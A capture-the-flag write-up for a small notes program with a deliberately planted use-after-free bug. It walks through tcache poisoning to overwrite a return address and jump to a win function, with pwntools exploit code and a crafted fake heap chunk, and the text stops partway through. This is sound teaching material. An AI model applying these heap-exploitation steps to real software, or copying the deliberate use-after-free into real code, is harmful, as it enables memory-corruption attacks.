# description

a simple app to create notes, basically i just asked chatGPT to write it and commented the part where it NULLiffy the pointer after freeing it, very basic use after free vulnerbility

![](../media/Screen%20Shot%202024-07-18%20at%205.02.20%20AM.png)

we can create a note, update it, and delete it, the problem is when we delete a note we can still read it and update it (use after free)

# solutions

tldr: we use tcache poisning to inject a malicious tcache chunk that points to the stack in order to override the return address and jump to win function

first let's examine what happens when we create a note:

![](../media/Screen%20Shot%202024-07-18%20at%205.11.35%20AM.png)

since the size passed to malloc is `0x100`, the chunk returned will be in the `tcache` bin, so now we need to create 2 chunks, update the first to point to the malicious one, then reallocating them, then updating the malicious chunk to override the return address.

## creating the malicious chunk

at the start of the program we are given a 4 bytes read and a stack pointer + win address is given to us, this make the creation much easy, also since the free bytes are written in stack and canary is not enabled, we can just update the malicious chunk itself to override the return address.

## the exploit

first we make this class just to facilitate our interaction with the process
```py
 class IO:
     def __init__(self, p):
         self.p = p
 
     def create(self, note):
         self.p.sendlineafter(b"Choose an option: ", b'1', timeout=0.1)
         self.p.sendlineafter(b"Enter note text: ", note, timeout=0.1)
 
     def update(self, index, new):
         self.p.sendlineafter(b"Choose an option: ", b'2', timeout=0.1)
         self.p.sendlineafter(b"): ", str(index).encode(), timeout=0.1)
         self.p.sendlineafter(b"Enter updated note text (up to 255 characters): ", new, timeout=0.1)
 
     def exit(self):
         self.p.sendlineafter(b"Choose an option: ", b'4', timeout=0.1)
 
     def delete(self, index):
         self.p.sendlineafter(b"Choose an option: ", b'3', timeout=0.1)
         self.p.sendlineafter(b"): ", str(index).encode(), timeout=0.1)
```

next we capture the stack address and the win function address then create the malicouse chunk
```py
with process('./a.out') as p:
    io = IO(p)

    tmp = p.recv()
    stack = tmp[tmp.find(b'location'):].split(b' ')[1].replace(b',', b'')[2:]
    stack = int(stack, 16)
    print(f"[*] got stack address {hex(stack)}")
    retaddr = tmp.split(b' ')[-1].replace(b'\n', b'')[2:]
    retaddr = int(retaddr, 16)
    print(f"[*] got ret address: {hex(retaddr)}")
    p.sendline(p64(0x0) + p64(0x111) + p64(mangle(stack+8*2, stack + 0x8*2)) + p64(0x111));
```
the form of the malicouse chunk is as follow
```
+-----------------------------------------+
|  the size of the chunk (0x110)          |
+-----------------------------------------+
|                                         |
+-----------------------------------------+
```